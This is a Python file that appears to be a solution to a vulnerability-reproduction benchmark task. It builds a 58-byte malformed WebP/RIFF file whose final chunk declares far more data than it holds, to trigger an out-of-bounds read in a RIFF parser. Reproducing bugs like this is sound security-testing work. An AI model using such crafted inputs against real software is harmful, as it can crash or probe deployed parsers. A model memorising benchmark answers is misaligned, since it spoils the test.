import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is an out-of-bounds read in a RIFF parser.
        # This can be triggered by creating a file where a chunk's declared
        # size is larger than the actual data available in the file buffer.
        # We craft a 58-byte WebP file to match the ground-truth length.

        # RIFF header: 'RIFF' (4) + file_size (4) + 'WEBP' (4)
        # file_size = total_size - 8 = 58 - 8 = 50
        poc = b'RIFF'
        poc += struct.pack('<I', 50)
        poc += b'WEBP'

        # VP8X chunk: 'VP8X' (4) + chunk_size (4) + data (10)
        # A valid-looking VP8X chunk is often necessary to pass initial
        # parsing checks and reach the vulnerable code for subsequent chunks.
        poc += b'VP8X'
        poc += struct.pack('<I', 10)
        poc += b'\x00' * 10

        # Malicious chunk: 'AAAA' (4) + chunk_size (4) + data (20)
        # The declared size is much larger than the remaining 20 bytes of
        # data in the file, causing a read past the buffer's end.
        # Current length: 12 (RIFF) + 18 (VP8X) = 30 bytes.
        # Remaining length: 58 - 30 = 28 bytes.
        # Malicious chunk header: 8 bytes. Data: 20 bytes.
        poc += b'AAAA'  # Arbitrary chunk FourCC
        poc += struct.pack('<I', 4096)  # A large size
        poc += b'\x00' * 20

        return poc